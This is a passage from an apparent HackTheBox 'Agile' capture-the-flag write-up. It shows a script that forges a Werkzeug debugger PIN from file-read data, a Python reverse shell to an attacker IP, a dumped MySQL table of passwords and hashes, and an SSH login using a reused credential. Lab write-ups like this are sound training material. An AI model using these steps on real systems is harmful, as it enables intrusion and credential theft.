</span></span><span class=line><span class=cl>    <span class=s1>&#39;ed5b159560f54721827644bc9b220d00superpass.service&#39;</span><span class=c1># get_machine_id(), /etc/machine-id</span>
</span></span><span class=line><span class=cl><span class=p>]</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>h</span> <span class=o>=</span> <span class=n>hashlib</span><span class=o>.</span><span class=n>sha1</span><span class=p>()</span>
</span></span><span class=line><span class=cl><span class=k>for</span> <span class=n>bit</span> <span class=ow>in</span> <span class=n>chain</span><span class=p>(</span><span class=n>probably_public_bits</span><span class=p>,</span> <span class=n>private_bits</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=ow>not</span> <span class=n>bit</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=k>continue</span>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=nb>isinstance</span><span class=p>(</span><span class=n>bit</span><span class=p>,</span> <span class=nb>str</span><span class=p>):</span>
</span></span><span class=line><span class=cl>        <span class=n>bit</span> <span class=o>=</span> <span class=n>bit</span><span class=o>.</span><span class=n>encode</span><span class=p>(</span><span class=s1>&#39;utf-8&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>h</span><span class=o>.</span><span class=n>update</span><span class=p>(</span><span class=n>bit</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>h</span><span class=o>.</span><span class=n>update</span><span class=p>(</span><span class=sa>b</span><span class=s1>&#39;cookiesalt&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=c1>#h.update(b&#39;shittysalt&#39;)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>cookie_name</span> <span class=o>=</span> <span class=s1>&#39;__wzd&#39;</span> <span class=o>+</span> <span class=n>h</span><span class=o>.</span><span class=n>hexdigest</span><span class=p>()[:</span><span class=mi>20</span><span class=p>]</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>num</span> <span class=o>=</span> <span class=kc>None</span>
</span></span><span class=line><span class=cl><span class=k>if</span> <span class=n>num</span> <span class=ow>is</span> <span class=kc>None</span><span class=p>:</span>
</span></span><span class=line><span class=cl>    <span class=n>h</span><span class=o>.</span><span class=n>update</span><span class=p>(</span><span class=sa>b</span><span class=s1>&#39;pinsalt&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>num</span> <span class=o>=</span> <span class=p>(</span><span class=s1>&#39;</span><span class=si>%09d</span><span class=s1>&#39;</span> <span class=o>%</span> <span class=nb>int</span><span class=p>(</span><span class=n>h</span><span class=o>.</span><span class=n>hexdigest</span><span class=p>(),</span> <span class=mi>16</span><span class=p>))[:</span><span class=mi>9</span><span class=p>]</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>rv</span> <span class=o>=</span><span class=kc>None</span>
</span></span><span class=line><span class=cl><span class=k>if</span> <span class=n>rv</span> <span class=ow>is</span> <span class=kc>None</span><span class=p>:</span>
</span></span><span class=line><span class=cl>    <span class=k>for</span> <span class=n>group_size</span> <span class=ow>in</span> <span class=mi>5</span><span class=p>,</span> <span class=mi>4</span><span class=p>,</span> <span class=mi>3</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=k>if</span> <span class=nb>len</span><span class=p>(</span><span class=n>num</span><span class=p>)</span> <span class=o>%</span> <span class=n>group_size</span> <span class=o>==</span> <span class=mi>0</span><span class=p>:</span>
</span></span><span class=line><span class=cl>            <span class=n>rv</span> <span class=o>=</span> <span class=s1>&#39;-&#39;</span><span class=o>.</span><span class=n>join</span><span class=p>(</span><span class=n>num</span><span class=p>[</span><span class=n>x</span><span class=p>:</span><span class=n>x</span> <span class=o>+</span> <span class=n>group_size</span><span class=p>]</span><span class=o>.</span><span class=n>rjust</span><span class=p>(</span><span class=n>group_size</span><span class=p>,</span> <span class=s1>&#39;0&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>                          <span class=k>for</span> <span class=n>x</span> <span class=ow>in</span> <span class=nb>range</span><span class=p>(</span><span class=mi>0</span><span class=p>,</span> <span class=nb>len</span><span class=p>(</span><span class=n>num</span><span class=p>),</span> <span class=n>group_size</span><span class=p>))</span>
</span></span><span class=line><span class=cl>            <span class=k>break</span>
</span></span><span class=line><span class=cl>    <span class=k>else</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=n>rv</span> <span class=o>=</span> <span class=n>num</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=nb>print</span><span class=p>(</span><span class=n>rv</span><span class=p>)</span>
</span></span></code></pre></td></tr></table></div></div><p>For <code>public_bits</code>:</p><ul><li><p>the username <code>www-data</code> was taken from our environment earlier</p></li><li><p><code>flask.app</code> is standard</p></li><li><p><code>wsgi_app</code> took me a few attempts to get right &ndash; but we can see this in our stack trace &ndash; each line of the stack trace shows e.g. <code>#### File "/app/venv/lib/python3.10/site-packages/flask/app.py", line *2528*, in wsgi_app</code>, which gives us the <code>wsgi_app</code> app name</p></li><li><p>our stack trace also shows <code>/app/venv/lib/python3.10/site-packages/flask/app.py</code> , which we use for the app filename for flask</p></li></ul><p>For <code>private_bits</code>:</p><ul><li><p>we used LFI to read <code>/proc/net/arp</code> to find interface <code>eth0</code>, we then were able to read <code>/sys/class/net/eth0/address</code> to get the MAC address, and convert it to decimal <code>345052371875</code> using python</p></li><li><p>The machine ID is <code>/etc/machine-id</code> with the 3rd string after a <code>/</code> in<code>/proc/self/cgroup</code>, which is <code>superpass.service</code></p></li></ul><p>I noticed the init file for werkzeug we obtained via LFI was slightly different to the exploitation script from HackTricks above &ndash; we needed to use <code>hashlib.sha1()</code> rather than <code>hashlib.md5()</code></p><p>So running this tweaked for our target, we get the PIN:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl><span class=nv>$python3</span> exploit.py
</span></span><span class=line><span class=cl>114-891-007
</span></span></code></pre></td></tr></table></div></div><p>After entering the PIN, we can enter and execute arbitrary python via an in-browser REPL. So we open a netcat listener, then we use a python reverse shell:</p><p><img class=lazyload src=/svg/loading.min.svg data-src=/2023-08-06-agile-htb/assets/2023-03-19-21-10-02-image.png data-srcset="/2023-08-06-agile-htb/assets/2023-03-19-21-10-02-image.png, /2023-08-06-agile-htb/assets/2023-03-19-21-10-02-image.png 1.5x, /2023-08-06-agile-htb/assets/2023-03-19-21-10-02-image.png 2x" data-sizes=auto alt=/2023-08-06-agile-htb/assets/2023-03-19-21-10-02-image.png title=/2023-08-06-agile-htb/assets/2023-03-19-21-10-02-image.png width=1463 height=276></p><p>Above, we entered a reverse shell taken from <a href=https://revshells.com/ target=_blank rel="noopener noreffer">RevShells</a> into the REPL:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&#34;10.10.14.8&#34;,3322));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn(&#34;bash&#34;)
</span></span></code></pre></td></tr></table></div></div><p>This gives our shell!:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl><span class=nv>$nc</span> -lvnp <span class=m>3322</span>
</span></span><span class=line><span class=cl>Listening on 0.0.0.0 <span class=m>3322</span>
</span></span><span class=line><span class=cl>Connection received on 10.10.11.203 <span class=m>41284</span>
</span></span><span class=line><span class=cl><span class=o>(</span>venv<span class=o>)</span> www-data@agile:/app/app$ ls -al
</span></span><span class=line><span class=cl>ls -al
</span></span><span class=line><span class=cl>total <span class=m>28</span>
</span></span><span class=line><span class=cl>drwxr-xr-x <span class=m>5</span> corum runner <span class=m>4096</span> Feb  <span class=m>8</span> 16:29 .
</span></span><span class=line><span class=cl>drwxr-xr-x <span class=m>6</span> root  root   <span class=m>4096</span> Mar  <span class=m>8</span> 15:30 ..
</span></span><span class=line><span class=cl>drwxrwxr-x <span class=m>3</span> corum runner <span class=m>4096</span> Feb  <span class=m>8</span> 16:29 .pytest_cache
</span></span><span class=line><span class=cl>drwxr-xr-x <span class=m>2</span> corum runner <span class=m>4096</span> Feb  <span class=m>8</span> 16:29 __pycache__
</span></span><span class=line><span class=cl>-rw-rw-r-- <span class=m>1</span> corum runner   <span class=m>95</span> Jan <span class=m>23</span> 21:27 requirements.txt
</span></span><span class=line><span class=cl>drwxrwxr-x <span class=m>9</span> corum runner <span class=m>4096</span> Mar  <span class=m>7</span> 21:55 superpass
</span></span><span class=line><span class=cl>-rw-r--r-- <span class=m>1</span> corum runner  <span class=m>105</span> Jan <span class=m>24</span> 18:08 wsgi.py
</span></span><span class=line><span class=cl><span class=o>(</span>venv<span class=o>)</span> www-data@agile:/app/app$ 
</span></span><span class=line><span class=cl><span class=o>(</span>venv<span class=o>)</span> www-data@agile:/dev/shm$ ls -la /home
</span></span><span class=line><span class=cl>ls -la /home
</span></span><span class=line><span class=cl>total <span class=m>20</span>
</span></span><span class=line><span class=cl>drwxr-xr-x  <span class=m>5</span> root      root      <span class=m>4096</span> Feb  <span class=m>8</span> 16:29 .
</span></span><span class=line><span class=cl>drwxr-xr-x <span class=m>20</span> root      root      <span class=m>4096</span> Feb <span class=m>20</span> 23:29 ..
</span></span><span class=line><span class=cl>drwxr-x---  <span class=m>8</span> corum     corum     <span class=m>4096</span> Feb  <span class=m>8</span> 16:29 corum
</span></span><span class=line><span class=cl>drwxr-x---  <span class=m>2</span> dev_admin dev_admin <span class=m>4096</span> Feb  <span class=m>8</span> 16:29 dev_admin
</span></span><span class=line><span class=cl>drwxr-x---  <span class=m>5</span> edwards   edwards   <span class=m>4096</span> Mar <span class=m>19</span> 06:41 edwards
</span></span></code></pre></td></tr></table></div></div><p>Previously, we found the database connection string in the app config:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-json data-lang=json><span class=line><span class=cl><span class=p>{</span><span class=nt>&#34;SQL_URI&#34;</span><span class=p>:</span> <span class=s2>&#34;mysql+pymysql://superpassuser:dSA6l7q*yIVs$39Ml6ywvgK@localhost/superpass&#34;</span><span class=p>}</span><span class=err>&#34;</span>
</span></span></code></pre></td></tr></table></div></div><p>We can connect directly, as <code>mysql</code> client is available:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>  1
</span><span class=lnt>  2
</span><span class=lnt>  3
</span><span class=lnt>  4
</span><span class=lnt>  5
</span><span class=lnt>  6
</span><span class=lnt>  7
</span><span class=lnt>  8
</span><span class=lnt>  9
</span><span class=lnt> 10
</span><span class=lnt> 11
</span><span class=lnt> 12
</span><span class=lnt> 13
</span><span class=lnt> 14
</span><span class=lnt> 15
</span><span class=lnt> 16
</span><span class=lnt> 17
</span><span class=lnt> 18
</span><span class=lnt> 19
</span><span class=lnt> 20
</span><span class=lnt> 21
</span><span class=lnt> 22
</span><span class=lnt> 23
</span><span class=lnt> 24
</span><span class=lnt> 25
</span><span class=lnt> 26
</span><span class=lnt> 27
</span><span class=lnt> 28
</span><span class=lnt> 29
</span><span class=lnt> 30
</span><span class=lnt> 31
</span><span class=lnt> 32
</span><span class=lnt> 33
</span><span class=lnt> 34
</span><span class=lnt> 35
</span><span class=lnt> 36
</span><span class=lnt> 37
</span><span class=lnt> 38
</span><span class=lnt> 39
</span><span class=lnt> 40
</span><span class=lnt> 41
</span><span class=lnt> 42
</span><span class=lnt> 43
</span><span class=lnt> 44
</span><span class=lnt> 45
</span><span class=lnt> 46
</span><span class=lnt> 47
</span><span class=lnt> 48
</span><span class=lnt> 49
</span><span class=lnt> 50
</span><span class=lnt> 51
</span><span class=lnt> 52
</span><span class=lnt> 53
</span><span class=lnt> 54
</span><span class=lnt> 55
</span><span class=lnt> 56
</span><span class=lnt> 57
</span><span class=lnt> 58
</span><span class=lnt> 59
</span><span class=lnt> 60
</span><span class=lnt> 61
</span><span class=lnt> 62
</span><span class=lnt> 63
</span><span class=lnt> 64
</span><span class=lnt> 65
</span><span class=lnt> 66
</span><span class=lnt> 67
</span><span class=lnt> 68
</span><span class=lnt> 69
</span><span class=lnt> 70
</span><span class=lnt> 71
</span><span class=lnt> 72
</span><span class=lnt> 73
</span><span class=lnt> 74
</span><span class=lnt> 75
</span><span class=lnt> 76
</span><span class=lnt> 77
</span><span class=lnt> 78
</span><span class=lnt> 79
</span><span class=lnt> 80
</span><span class=lnt> 81
</span><span class=lnt> 82
</span><span class=lnt> 83
</span><span class=lnt> 84
</span><span class=lnt> 85
</span><span class=lnt> 86
</span><span class=lnt> 87
</span><span class=lnt> 88
</span><span class=lnt> 89
</span><span class=lnt> 90
</span><span class=lnt> 91
</span><span class=lnt> 92
</span><span class=lnt> 93
</span><span class=lnt> 94
</span><span class=lnt> 95
</span><span class=lnt> 96
</span><span class=lnt> 97
</span><span class=lnt> 98
</span><span class=lnt> 99
</span><span class=lnt>100
</span><span class=lnt>101
</span><span class=lnt>102
</span><span class=lnt>103
</span><span class=lnt>104
</span><span class=lnt>105
</span><span class=lnt>106
</span><span class=lnt>107
</span><span class=lnt>108
</span><span class=lnt>109
</span><span class=lnt>110
</span><span class=lnt>111
</span><span class=lnt>112
</span><span class=lnt>113
</span><span class=lnt>114
</span><span class=lnt>115
</span><span class=lnt>116
</span><span class=lnt>117
</span><span class=lnt>118
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl><span class=o>(</span>venv<span class=o>)</span> www-data@agile:/dev/shm$ mysql -u superpassuser -p
</span></span><span class=line><span class=cl>mysql -u superpassuser -p
</span></span><span class=line><span class=cl>Enter password: dSA6l7q*yIVs<span class=nv>$39</span>Ml6ywvgK
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>Welcome to the MySQL monitor.  Commands end with <span class=p>;</span> or <span class=se>\g</span>.
</span></span><span class=line><span class=cl>Your MySQL connection id is <span class=m>2060</span>
</span></span><span class=line><span class=cl>Server version: 8.0.32-0ubuntu0.22.04.2 <span class=o>(</span>Ubuntu<span class=o>)</span>
</span></span><span class=line><span class=cl>mysql&gt; show databases<span class=p>;</span>
</span></span><span class=line><span class=cl>show databases<span class=p>;</span>
</span></span><span class=line><span class=cl>+--------------------+
</span></span><span class=line><span class=cl><span class=p>|</span> Database           <span class=p>|</span>
</span></span><span class=line><span class=cl>+--------------------+
</span></span><span class=line><span class=cl><span class=p>|</span> information_schema <span class=p>|</span>
</span></span><span class=line><span class=cl><span class=p>|</span> performance_schema <span class=p>|</span>
</span></span><span class=line><span class=cl><span class=p>|</span> superpass          <span class=p>|</span>
</span></span><span class=line><span class=cl>+--------------------+
</span></span><span class=line><span class=cl><span class=m>3</span> rows in <span class=nb>set</span> <span class=o>(</span>0.01 sec<span class=o>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>mysql&gt; use superpass
</span></span><span class=line><span class=cl>use superpass
</span></span><span class=line><span class=cl>Reading table information <span class=k>for</span> completion of table and column names
</span></span><span class=line><span class=cl>You can turn off this feature to get a quicker startup with -A
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>Database changed
</span></span><span class=line><span class=cl>mysql&gt; show tables<span class=p>;</span>
</span></span><span class=line><span class=cl>show tables<span class=p>;</span>
</span></span><span class=line><span class=cl>+---------------------+
</span></span><span class=line><span class=cl><span class=p>|</span> Tables_in_superpass <span class=p>|</span>
</span></span><span class=line><span class=cl>+---------------------+
</span></span><span class=line><span class=cl><span class=p>|</span> passwords           <span class=p>|</span>
</span></span><span class=line><span class=cl><span class=p>|</span> users               <span class=p>|</span>
</span></span><span class=line><span class=cl>+---------------------+
</span></span><span class=line><span class=cl><span class=m>2</span> rows in <span class=nb>set</span> <span class=o>(</span>0.00 sec<span class=o>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>mysql&gt; <span class=k>select</span> * from passwords<span class=p>;</span>
</span></span><span class=line><span class=cl><span class=k>select</span> * from passwords<span class=p>;</span>
</span></span><span class=line><span class=cl>+----+---------------------+---------------------+----------------+----------+----------------------+---------+
</span></span><span class=line><span class=cl><span class=p>|</span> id <span class=p>|</span> created_date        <span class=p>|</span> last_updated_data   <span class=p>|</span> url            <span class=p>|</span> username <span class=p>|</span> password             <span class=p>|</span> user_id <span class=p>|</span>
</span></span><span class=line><span class=cl>+----+---------------------+---------------------+----------------+----------+----------------------+---------+
</span></span><span class=line><span class=cl><span class=p>|</span>  <span class=m>3</span> <span class=p>|</span> 2022-12-02 21:21:32 <span class=p>|</span> 2022-12-02 21:21:32 <span class=p>|</span> hackthebox.com <span class=p>|</span> 0xdf     <span class=p>|</span> 762b430d32eea2f12970 <span class=p>|</span>       <span class=m>1</span> <span class=p>|</span>
</span></span><span class=line><span class=cl><span class=p>|</span>  <span class=m>4</span> <span class=p>|</span> 2022-12-02 21:22:55 <span class=p>|</span> 2022-12-02 21:22:55 <span class=p>|</span> mgoblog.com    <span class=p>|</span> 0xdf     <span class=p>|</span> 5b133f7a6a1c180646cb <span class=p>|</span>       <span class=m>1</span> <span class=p>|</span>
</span></span><span class=line><span class=cl><span class=p>|</span>  <span class=m>6</span> <span class=p>|</span> 2022-12-02 21:24:44 <span class=p>|</span> 2022-12-02 21:24:44 <span class=p>|</span> mgoblog        <span class=p>|</span> corum    <span class=p>|</span> 47ed1e73c955de230a1d <span class=p>|</span>       <span class=m>2</span> <span class=p>|</span>
</span></span><span class=line><span class=cl><span class=p>|</span>  <span class=m>7</span> <span class=p>|</span> 2022-12-02 21:25:15 <span class=p>|</span> 2022-12-02 21:25:15 <span class=p>|</span> ticketmaster   <span class=p>|</span> corum    <span class=p>|</span> 9799588839ed0f98c211 <span class=p>|</span>       <span class=m>2</span> <span class=p>|</span>
</span></span><span class=line><span class=cl><span class=p>|</span>  <span class=m>8</span> <span class=p>|</span> 2022-12-02 21:25:27 <span class=p>|</span> 2022-12-02 21:25:27 <span class=p>|</span> agile          <span class=p>|</span> corum    <span class=p>|</span> 5db7caa1d13cc37c9fc2 <span class=p>|</span>       <span class=m>2</span> <span class=p>|</span>
</span></span><span class=line><span class=cl>+----+---------------------+---------------------+----------------+----------+----------------------+---------+
</span></span><span class=line><span class=cl><span class=m>5</span> rows in <span class=nb>set</span> <span class=o>(</span>0.00 sec<span class=o>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>mysql&gt; <span class=k>select</span> * from users<span class=se>\G</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=k>select</span> * from users<span class=se>\G</span><span class=p>;</span>
</span></span><span class=line><span class=cl>*************************** 1. row ***************************
</span></span><span class=line><span class=cl>             id: <span class=m>1</span>
</span></span><span class=line><span class=cl>       username: 0xdf
</span></span><span class=line><span class=cl>hashed_password: <span class=nv>$6$rounds</span><span class=o>=</span>200000<span class=nv>$FRtvqJFfrU7DSyT7$8</span>eGzz8Yk7vTVKudEiFBCL1T7O4bXl0.yJlzN0jp.q0choSIBfMqvxVIjdjzStZUYg6mSRB2Vep0qELyyr0fqF.
</span></span><span class=line><span class=cl>*************************** 2. row ***************************
</span></span><span class=line><span class=cl>             id: <span class=m>2</span>
</span></span><span class=line><span class=cl>       username: corum
</span></span><span class=line><span class=cl>hashed_password: <span class=nv>$6$rounds</span><span class=o>=</span>200000<span class=nv>$yRvGjY1MIzQelmMX$9273</span>p66QtJQb9afrbAzugxVFaBhb9lyhp62cirpxJEOfmIlCy/LILzFxsyWj/mZwubzWylr3iaQ13e4zmfFfB1
</span></span><span class=line><span class=cl>*************************** 3. row ***************************
</span></span><span class=line><span class=cl>             id: <span class=m>9</span>
</span></span><span class=line><span class=cl>       username: kevin
</span></span><span class=line><span class=cl>hashed_password: <span class=nv>$6$rounds</span><span class=o>=</span>200000<span class=nv>$GuoLoNS1deSS6NwL$ikp6iJBdpHRFLXF7pQd8mlDCp1CPxHahTUHZ4Fkx5QEPQEk8O9CHaevdQtWwh0vQFHn3cD4qgQvlGfYk3vwQE0</span>
</span></span><span class=line><span class=cl>*************************** 4. row ***************************
</span></span><span class=line><span class=cl>             id: <span class=m>10</span>
</span></span><span class=line><span class=cl>       username: ehab
</span></span><span class=line><span class=cl>hashed_password: <span class=nv>$6$rounds</span><span class=o>=</span>200000<span class=nv>$K0q00NQQcl0hjXq</span>/<span class=nv>$IwIKlzFtMD2gVsccHWUoTIQDJ9r4KDMwI6n1JAgxq8GUwE5PQDClvQHQEeJ5f</span>/ZKiTRP4pSEsVKeIVXQfJl5N.
</span></span><span class=line><span class=cl>*************************** 5. row ***************************
</span></span><span class=line><span class=cl>             id: <span class=m>11</span>
</span></span><span class=line><span class=cl>       username: admin
</span></span><span class=line><span class=cl>hashed_password: <span class=nv>$6$rounds</span><span class=o>=</span>200000<span class=nv>$e4UHczzGOVBoS5Fg$hkka0dJ0i1uAV7gSIIY9gnXKpk05VHlnzF0j83el4cw3AYDYdv8faF37icGZ9imGj7wF9JoBRzet6vRwJsJ</span>/n1
</span></span><span class=line><span class=cl>*************************** 6. row ***************************
</span></span><span class=line><span class=cl>             id: <span class=m>12</span>
</span></span><span class=line><span class=cl>       username: admin1
</span></span><span class=line><span class=cl>hashed_password: <span class=nv>$6$rounds</span><span class=o>=</span>200000<span class=nv>$Y16DIJ8bGsWwD5vs$IyRnY9Zzmy</span>.0I7UuF/ZUI2XNVnNeLy/tKLMTncrYujsnzD3W3eEdhqMeIwG7PJDkzZU7Ko.sH.V9E705EWjFa/
</span></span><span class=line><span class=cl>*************************** 7. row ***************************
</span></span><span class=line><span class=cl>             id: <span class=m>13</span>
</span></span><span class=line><span class=cl>       username: <span class=m>1234</span>
</span></span><span class=line><span class=cl>hashed_password: <span class=nv>$6$rounds</span><span class=o>=</span>200000<span class=nv>$bcWds2t8z5uCU</span>.fS<span class=nv>$nmZeZUxm6GccdWyInfpvvc</span>.63Du5tzgrNo2Aos4XRhEfjxZABt25aAjK0h56R5BgzjwqOlrzQRxrTgk9O8dRp1
</span></span><span class=line><span class=cl>*************************** 8. row ***************************
</span></span><span class=line><span class=cl>             id: <span class=m>14</span>
</span></span><span class=line><span class=cl>       username: momo
</span></span><span class=line><span class=cl>hashed_password: <span class=nv>$6$rounds</span><span class=o>=</span>200000<span class=nv>$at3fhhkaH9HGORJX$OUqvuldZun6Jal1kgyLbkBziQoGcJV</span>.nknNeVYyRdmgq7OBj4yW9743jaqk0ViXLGSUIqxdvF93iyCUR2Zhw5.
</span></span><span class=line><span class=cl>*************************** 9. row ***************************
</span></span><span class=line><span class=cl>             id: <span class=m>15</span>
</span></span><span class=line><span class=cl>       username: awdwad
</span></span><span class=line><span class=cl>hashed_password: <span class=nv>$6$rounds</span><span class=o>=</span>200000<span class=nv>$gOM0koAy0o793sd0$jt4v8FUrzlQ0gkilbstvzUewkMBHqt4</span>.n8pxZg6BzEcl9NT2.jozqfEUYir98fokbI2txenVp6MaXv5jPipJr0
</span></span><span class=line><span class=cl>*************************** 10. row ***************************
</span></span><span class=line><span class=cl>             id: <span class=m>16</span>
</span></span><span class=line><span class=cl>       username: <span class=m>123</span>
</span></span><span class=line><span class=cl>hashed_password: <span class=nv>$6$rounds</span><span class=o>=</span>200000<span class=nv>$PB4tRcf1cPq4EbG7</span>$.gXO6Rxk5MG6wINf4uZUQoN9nKXWxzzw1aRwDn5qbfNsdTWlzM6YJHDzAwxLltWscHnqJlAn62KbuFCyFBtqU/
</span></span><span class=line><span class=cl>*************************** 11. row ***************************
</span></span><span class=line><span class=cl>             id: <span class=m>17</span>
</span></span><span class=line><span class=cl>       username: hello123
</span></span><span class=line><span class=cl>hashed_password: <span class=nv>$6$rounds</span><span class=o>=</span>200000<span class=nv>$7</span>Yhj7dMsrK5zQyFe<span class=nv>$xKtGlTm</span>.sBM3cSsvaE/yQloGyYmfHjh.IIom.BVHW2ca.AgRq.DkCn.vahyFH0H7513pyBjKXsdMS19Eb20RN/
</span></span><span class=line><span class=cl>*************************** 12. row ***************************
</span></span><span class=line><span class=cl>             id: <span class=m>18</span>
</span></span><span class=line><span class=cl>       username: a
</span></span><span class=line><span class=cl>hashed_password: <span class=nv>$6$rounds</span><span class=o>=</span>200000<span class=nv>$7</span>ylLiTKzRam4EbOG<span class=nv>$toeee</span>.99RZDK75Li7ChHwv05yJZos.1qsc857ZGgw.cznyRpaMDAMohZO/UbVE8EQRbmeBWXN.lNFhRHahsVo.
</span></span><span class=line><span class=cl>*************************** 13. row ***************************
</span></span><span class=line><span class=cl>             id: <span class=m>19</span>
</span></span><span class=line><span class=cl>       username: runner
</span></span><span class=line><span class=cl>hashed_password: <span class=nv>$6$rounds</span><span class=o>=</span>200000<span class=nv>$e5ZUsDG</span>/uC1N1gcn<span class=nv>$taIByjkoMxQQtZuVOJM0wkBZJIcHU7nxUzMWVFFwPj8AmUrDBRU6w8sOTNMLXCfcNhPKSlkwS</span>.eG1cuyqI0Au.
</span></span><span class=line><span class=cl>*************************** 14. row ***************************
</span></span><span class=line><span class=cl>             id: <span class=m>20</span>
</span></span><span class=line><span class=cl>       username: edwards
</span></span><span class=line><span class=cl>hashed_password: <span class=nv>$6$rounds</span><span class=o>=</span>200000<span class=nv>$mfBd9LLaKMu5i8Gf$Ontkw8mscskUrqbVKMA34rYWHg0tllBLRjeE6a6zHNgeHA3w9WnMw</span>.gFUM/heDHa/rMxOZj72/J.B8M9rKh6Q0
</span></span><span class=line><span class=cl>*************************** 15. row ***************************
</span></span><span class=line><span class=cl>             id: <span class=m>21</span>
</span></span><span class=line><span class=cl>       username: jsomeone
</span></span><span class=line><span class=cl>hashed_password: <span class=nv>$6$rounds</span><span class=o>=</span>200000<span class=nv>$CO</span>.rufBZOiwsFTZd<span class=nv>$M</span>..0yCgkzxX5ponsziWj5UG2WMnTJyioCY7sB9Tw3Xqpv4PxMzaqUMngWLYAFZ7CJUX166BTNegpFcz09a3cP0
</span></span><span class=line><span class=cl>*************************** 16. row ***************************
</span></span><span class=line><span class=cl>             id: <span class=m>22</span>
</span></span><span class=line><span class=cl>       username: wolf
</span></span><span class=line><span class=cl>hashed_password: <span class=nv>$6$rounds</span><span class=o>=</span>200000<span class=nv>$HiFn</span>.rnUHHnuzrF9<span class=nv>$cdbl86q2M6Fx225bS85C08thz19CEunUFRoW2is3l78HBvfrFnbgtF11en99Ul4AlYma8vdoNQm5FED</span>/5FxRD.
</span></span><span class=line><span class=cl>*************************** 17. row ***************************
</span></span><span class=line><span class=cl>             id: <span class=m>23</span>
</span></span><span class=line><span class=cl>       username: adam
</span></span><span class=line><span class=cl>hashed_password: <span class=nv>$6$rounds</span><span class=o>=</span>200000<span class=nv>$1</span>aPfucxd8bmcInft<span class=nv>$y9TqXncRGZ1C2cY</span>/C6n1H.rVeJWMMdNmV5PihmniDmKVORx3A6N2OG3qkUhCEqymhVUS1yqWPIp/nns7j417S.
</span></span><span class=line><span class=cl><span class=m>17</span> rows in <span class=nb>set</span> <span class=o>(</span>0.00 sec<span class=o>)</span>
</span></span></code></pre></td></tr></table></div></div><p>I decided to try the password for corum&rsquo;s ticketmaster account, to see if it was being reused for SSH &ndash; it works and we get the user flag!:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span><span class=lnt>23
</span><span class=lnt>24
</span><span class=lnt>25
</span><span class=lnt>26
</span><span class=lnt>27
</span><span class=lnt>28
</span><span class=lnt>29
</span><span class=lnt>30
</span><span class=lnt>31
</span><span class=lnt>32
</span><span class=lnt>33
</span><span class=lnt>34
</span><span class=lnt>35
</span><span class=lnt>36
</span><span class=lnt>37
</span><span class=lnt>38
</span><span class=lnt>39
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl><span class=nv>$sshpass</span> -p 5db7caa1d13cc37c9fc2 ssh corum@superpass.htb
</span></span><span class=line><span class=cl>Welcome to Ubuntu 22.04.2 LTS <span class=o>(</span>GNU/Linux 5.15.0-60-generic x86_64<span class=o>)</span>
</span></span><span class=line><span class=cl>
